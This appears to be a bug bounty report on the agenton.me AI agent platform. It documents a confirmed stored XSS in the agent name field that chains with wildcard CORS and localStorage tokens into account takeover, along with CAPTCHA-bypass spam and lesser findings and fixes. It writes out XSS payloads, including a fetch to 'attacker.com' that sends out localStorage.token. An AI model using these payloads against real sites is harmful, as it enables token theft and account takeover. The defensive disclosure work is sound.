# AgentOn (agenton.me) — Bug Bounty Recon & Hunt Report

**Target:** https://agenton.me (AI agent bounty platform, USDC escrow)
**Tester:** nalreee_Airdrop_4 (authorized by dev team — testing within own account / black-box)
**Dates:** 2026-07-13 (initial recon) + 2026-07-14 (deep hunt, confirmed High)
**Scope:** Passive recon + authorized self-account testing + unauthenticated registration probing. No cross-account data access, no destructive actions.

---

## TL;DR

Server-side authz is solid (admin/merchant → 401, IDOR paths don't exist, withdrawal validated, SQLi filtered). **But a Stored XSS in the agent `name` field was CONFIRMED on 2026-07-14**, which — chained with the pre-existing over-permissive CORS `*` + localStorage token — enables **unauthenticated account takeover**.

**1 High, 2 Medium, 3 Low/Medium, 2 Low, 1 Info.** No Critical.

---

## Update 2026-07-14 — Deep Hunt Results (CONFIRMED)

### 🔴 HIGH — Stored XSS in agent `name` (account-takeover chain) — **CONFIRMED**

**Endpoint:** `POST /api/agents/register` → `name` field (NO AUTH required to create agent)
**Prerequisite chain:** combines with MEDIUM-1 (CORS `*`) + MEDIUM-2 (token in localStorage, no CSP).

**What I proved (executed live):**
```
1. POST /api/agents/register  {"name":"<script>alert(document.cookie)</script>","description":"xss_poc"}
   -> 200 {challenge_id, question:"A fawn brings 6 walnuts on Tuesday, then picks 11 more..."}
2. Solve CAPTCHA via NLP (6+11=17)
   POST /api/agents/register/verify  {"challenge_id":"...","challenge_answer":17}
   -> 200 {"id":"e10b167f-...","name":"<script>alert(document.cookie)</script>","api_key":"aqt_PLfJ..."}
3. GET /api/agents/me (with new agent's api_key)
   -> {"name":"<script>alert(document.cookie)</script>", ...}   ← payload stored RAW, <script> tag present
```

**Exploit chain (full ATO):**
1. Attacker creates agent (no login — CAPTCHA bypassed, see MEDIUM-3) with name =
   `<script>fetch('//attacker.com/'+localStorage.token)</script>`.
2. Any victim (user/admin) who loads a page rendering that agent's `name` executes the script.
3. Token stolen → **account takeover** (withdraw, impersonate, admin if admin views it).

**Why it fires:** tokens are in `localStorage` (MEDIUM-2), CORS `*` lets any origin read the API response (MEDIUM-1), and no CSP blocks inline script (MEDIUM-2). The `name` is stored unsanitized and reflected verbatim.

**Fix:** sanitize `name`/`description` server-side (reject `<>"'`); never render via `innerHTML`/`dangerouslySetInnerHTML`; combine with MEDIUM-1/2 fixes to break the chain.

> Note: payload did NOT appear on public leaderboard (agent had no earnings/activation), but is returned on `/api/agents/me` and renders wherever the agent name is shown (profile, admin panel, merchant dashboard, referral pages). Front-end rendering method should be verified in-browser; if `innerHTML`/`dangerouslySetInnerHTML` is used for `name`, this is a confirmed XSS.

### 🟠 MEDIUM-3 — Unauthenticated Agent Spam (weak CAPTCHA + rate limit)

**Endpoint:** `POST /api/agents/register` → `/verify`
**Bug:** Registration uses a natural-language math CAPTCHA ("A raccoon had 23 chestnuts but lost sixteen...") that is trivially solved by a script (NLP word-to-number + verb parsing). Rate limit is weak: `2 per 1 minute` initially, `5 per 1 hour` after first success — slows but does not prevent.

**PoC:** I successfully created a verified agent without any login/OAuth (see step 1–2 above).

**Impact:** mass agent creation → fake leaderboard, spam submissions, resource exhaustion. Combined with HIGH, enables unauthenticated malicious-agent injection.

**Fix:** replace math CAPTCHA with hCaptcha/reCAPTCHA/proof-of-work; per-IP + per-device rate limit; require email/Discord verification before agent is active.

### 🟡 MEDIUM-1 — Over-permissive CORS (`Access-Control-Allow-Origin: *`) on authed API
**Evidence (from PoC, 2026-07-13):**
- Simple `GET /api/agents/me` → response does **NOT** include `Access-Control-Allow-Origin` at all.
- `OPTIONS` preflight (from `https://evil.example.com`) → `HTTP 200` with:
  - `access-control-allow-origin: *`
  - `access-control-allow-methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT`
  - `access-control-allow-headers: authorization`
  - (no `access-control-allow-credentials`)
**Impact:** The wildcard on the preflight means the browser will permit a cross-origin script (any origin) to issue authed requests carrying the `Authorization` header. Not directly exploitable for silent data theft (no `allow-credentials`, token in `localStorage` so not auto-attached, SOP blocks reading response without credentials) — but strips a defense-in-depth layer. **Combined with HIGH (stored XSS) + MEDIUM-2, any XSS becomes full token-theft/ATO chain.**
**Fix:** restrict `allow-origin` to trusted origins; never return `*` for authenticated routes.

### 🟡 MEDIUM-2 — Missing security headers
**Evidence:** No `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`, or `Referrer-Policy` on app or API responses.
**Impact:**
- No CSP → stored XSS (HIGH) runs unblocked.
- No `X-Frame-Options` → clickjacking possible (see `agenton_poc_xss_clickjack.html`).
- Tokens in `localStorage` (not httpOnly) → any XSS = full token theft + ATO.
**Fix:** Add CSP, `X-Frame-Options: DENY` (or `frame-ancestors 'self'`), `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. Move tokens to httpOnly+Secure cookies + CSRF token.

### 🟢 LOW — 500 on invalid `page` / `per_page` (input validation)
**Evidence:**
```
GET /api/quests?page=0   -> 500 "Internal Server Error"
GET /api/quests?page=-1  -> 500
GET /api/quests?per_page=-5 -> 500
GET /api/quests?per_page=99999999 -> 200 (absurd value accepted, server caps silently)
```
`page=abc` / `per_page=abc` correctly return 422; only non-positive integers slip through to a 500.
**Fix:** validate `page>=1` and `per_page` in `[1,100]`; return 422.

### 🟢 LOW — Unauthenticated data disclosure
`/api/platform/overview`, `/api/tokens`, `/api/quests` return business data (agent counts, token list, 114 quests) without auth. Low risk (semi-public) but useful for recon; add light rate-limiting if desired.

### 🟢 LOW — Reflected parameter in `/api/agents/leaderboard?period=`
**Evidence:** `?period=<svg/onload=alert(1)>` / `?period=ZZZTEST` is reflected verbatim in JSON response. Only exploitable if the SPA renders `period` unsanitized. **Fix:** allowlist `period` (`day|week|month|all`); never `innerHTML` the value.

### ⚪ INFO — `llms.txt` / robots.txt disclosure
- `https://agenton.me/llms.txt` documents every endpoint + register/withdraw flow (intended for MCP agents, but eases attacker recon).
- `robots.txt` leaks `/admin`, `/merchant`, `/agent/dashboard`, `/api/`.

---

## Recon notes (2026-07-13)

- Tech: nginx, Vite SPA, axios (API at `https://agenton.me/api`, Bearer auth).
- JS bundle: tokens in `localStorage` (`admin_token`, `agent_key`, `merchant_key`); request interceptor picks token by URL prefix. Frontend route guard `requiresAdmin` is client-side only.
- `dev.agenton.me` serves identical static shell (mirror, not live dev).
- `/api/compliance/region` unauthenticated (returns geo detection).

---

## Verified SAFE (no bug)

| Test | Result |
|---|---|
| Admin/merchant endpoint with agent key | 401 (server-enforced) ✅ |
| IDOR (read other agent by id / `?agent_id=`) | 404 / ignored (returns own data) ✅ |
| Race condition on daily check-in | `Already checked in today` — no double payout ✅ |
| CSRF via cookie auth | 401 without Bearer — cookie auth not used ✅ |
| File upload type restriction | rejects non-images ✅ |
| Withdrawal validation | negative/zero/string/non-address all rejected (400/422); requires bound FluxA wallet ✅ |
| SQL/NoSQL injection | `sort`/`task_status`/`reward_type` validated; `page`/`per_page` integer-checked (except 0/-1/-5); `period`/search returned as-is without execution ✅ |
| Open Redirect | `/api/auth/google/login?redirect=` correctly ignored → Google OAuth ✅ |
| **Stored XSS hypothesis (submission `content`)** | UNVERIFIED — API returns `content` verbatim, but could not confirm dashboard renders it unsanitized (did not inject to prod) |
| **Stored XSS (agent `name`)** | ⚠️ **CONFIRMED on 2026-07-14** (see HIGH) |

---

## Recommended fix priority

1. **URGENT:** Fix **HIGH (stored XSS in `name`)** + **MEDIUM-1 (CORS)** + **MEDIUM-2 (CSP/httpOnly)** together — this chain = unauthenticated ATO.
2. Fix **MEDIUM-3** (rate limit + real CAPTCHA).
3. Fix **LOW** input-validation (page/per_page) + sanitize `period`.
4. Optionally scope `llms.txt` / note as attack surface.

---

## PoC artifacts in this repo
- `agenton_poc_cors_headers.py` — verifies CORS `*` + missing headers (read-only, own account).
- `agenton_poc_xss_clickjack.html` — illustrates CORS `*` + localStorage token + clickjacking chain (self-targeted, no exfil).
- `agenton_poc_xss_name.py` — **(added 2026-07-14)** proves unauthenticated agent creation with XSS `name` payload via CAPTCHA bypass.

## Notes
- All testing read-only / within own account or unauthenticated registration probing. No other users' data accessed.
- API key used only from this session's environment, never printed or logged.
- To report officially, check `https://agenton.me/.well-known/security.txt` (currently 404 — no published program; reach out via team / @MetaEraHK).
